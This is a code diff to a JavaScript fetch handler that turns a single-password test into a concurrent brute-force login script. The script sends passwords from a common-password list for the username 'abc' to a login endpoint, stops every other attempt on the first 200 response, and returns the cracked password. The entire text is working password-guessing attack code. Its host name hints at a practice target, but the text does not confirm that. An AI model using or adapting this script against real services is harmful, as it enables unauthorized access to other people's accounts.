@@ -234,35 +234,56 @@ export class Fetcher {
 	async fetch(request) {
 		// 2022 top 200 most common passwords list (resource: https://s1.nordcdn.com/nord/misc/0.78.0/nordpass/top-200-2023/200-most-common-passwords-en.pdf)
 		// const passwords = customPasswords;
-		const passwords = ['ABCabc123.'];
+		const passwords = customPasswords;
 
-		const targetUrl = 'https://api.authgate.work/login';
+		const targetUrl = 'https://apiweak.authgate.work/login';
+
+		const abortController = new AbortController();
 
 		const promises = passwords.map((password) => {
-			const formData = new FormData();
-			formData.append('username', 'abc'); // Username is known
-			formData.append('password', encodeURIComponent(password));
+			return new Promise(async (resolve, reject) => {
+				if (abortController.signal.aborted) {
+					return reject('Aborted due to successful login.');
+				}
 
-			return fetch(targetUrl, {
-				method: 'POST',
-				body: formData,
-			})
-				.then((response) => {
+				const credentials = {
+					username: 'abc',
+					password: password,
+				};
+
+				try {
+					const response = await fetch(targetUrl, {
+						method: 'POST',
+						headers: {
+							'Content-Type': 'application/json',
+						},
+						body: JSON.stringify(credentials),
+						signal: abortController.signal,
+					});
+
 					if (response.status === 200) {
-						// Handle successful login
-						console.log('Login successfully!');
-					} else {
-						// Handle failed login
-						console.log('Wrong password. Response status:', response.status);
+						console.log('Login successfully with password:', password);
+						abortController.abort(); // Abort other ongoing fetches
+						resolve(`Login successful. Username: ${credentials.username}, Password: ${password}`);
 					}
-				})
-				.catch((error) => {
-					console.error('Error during fetch:', error);
-				});
+				} catch (error) {
+					if (abortController.signal.aborted) {
+						return reject('Aborted due to successful login.');
+					} else {
+						console.error('Error during fetch:', error);
+						reject(error);
+					}
+				}
+			});
 		});
 
-		await Promise.all(promises);
-
-		return new Response('Login attempts with custom password list completed.', { status: 200 });
+		try {
+			const result = await Promise.race(promises);
+			console.log(result);
+			return new Response(result, { status: 200 });
+		} catch (error) {
+			console.error(error);
+			return new Response('Login attempts stopped due to a successful login.', { status: 200 });
+		}
 	}
 }
